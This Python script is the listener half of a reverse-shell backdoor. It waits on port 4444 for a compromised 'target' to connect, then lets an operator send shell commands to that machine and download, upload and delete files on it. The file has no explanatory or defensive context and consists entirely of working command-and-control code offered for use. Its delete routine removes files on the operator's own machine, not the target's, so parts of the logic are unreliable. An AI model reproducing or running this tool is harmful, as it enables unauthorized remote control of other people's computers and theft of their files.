import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        target.settimeout(None)

def delete_file(file_name):
    try:
        os.remove(file_name)
        return "[+] File deleted successfully"
    except FileNotFoundError:
        return "[-] File not found"
    except Exception as e:
        return f"[-] Error deleting file: {str(e)}"

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:6] == 'delete':
            result = delete_file(command[7:])
            print(result)
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Use '0.0.0.0' to bind to all interfaces
sock.bind(('0.0.0.0', 4444))
print('[+] Listening For Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
